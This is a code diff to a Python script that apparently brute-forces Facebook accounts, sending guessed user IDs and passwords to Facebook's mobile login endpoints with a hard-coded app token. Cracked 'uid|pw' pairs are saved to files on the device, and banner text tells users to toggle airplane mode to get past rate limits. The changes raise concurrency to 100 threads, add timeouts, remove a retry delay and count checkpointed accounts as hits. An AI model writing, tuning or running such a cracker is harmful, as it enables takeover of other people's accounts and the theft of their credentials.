@@ -347,7 +347,7 @@ def old_One():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m● METHOD 2 ⚡ PREMIUM')
     linex()
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m◈ CHOICE ✦ {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=70) as pool:
+    with tred(max_workers=100) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m◈ TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m✈ USE AIRPLANE MODE FOR BEST RESULT ✈{G}")
@@ -386,7 +386,7 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m● METHOD B ⚡')
     linex()
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ CHOICE ✦ {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=70) as pool:
+    with tred(max_workers=100) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m✈ USE AIRPLANE MODE FOR BEST RESULT ✈{G}")
@@ -423,7 +423,7 @@ def old_Tree():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m● METHOD B ⚡')
     linex()
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ CHOICE ✦ {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=70) as pool:
+    with tred(max_workers=100) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m◈ TOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m✈ USE AIRPLANE MODE FOR BEST RESULT ✈{G}")
@@ -488,13 +488,13 @@ def login_1(uid):
                 'X-FB-Server-Cluster': 'True',
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=10).json()
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRDX\x1b[38;5;196m) \x1b[38;5;220m✅\x1b[1;97m=\x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[38;5;220m🔥 \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)} \x1b[38;5;51m★")
                 open('/sdcard/RDX-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+            elif 'www.facebook.com' in res.get('error', {}).get('message', '') or 'checkpoint' in str(res).lower() or 'c_user' in str(res):
                 print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRDX\x1b[38;5;196m) \x1b[38;5;220m✅\x1b[1;97m=\x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[38;5;220m🔥 \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)} \x1b[38;5;51m★")
                 open('/sdcard/RDX-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
@@ -504,7 +504,6 @@ def login_1(uid):
     except Exception:
         with loop_lock:
             loop += 1
-        time.sleep(2)
 
 
 def login_2(uid):
@@ -527,7 +526,7 @@ def login_2(uid):
                     'x-fb-http-engine': 'Liger'
                 }
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
+                po = session.get(url, headers=headers, timeout=10).json()
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRDX\x1b[38;5;196m) \x1b[38;5;220m✅\x1b[1;97m=\x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[38;5;220m🔥 \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)} \x1b[38;5;51m★")
                     open('/sdcard/RDX-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
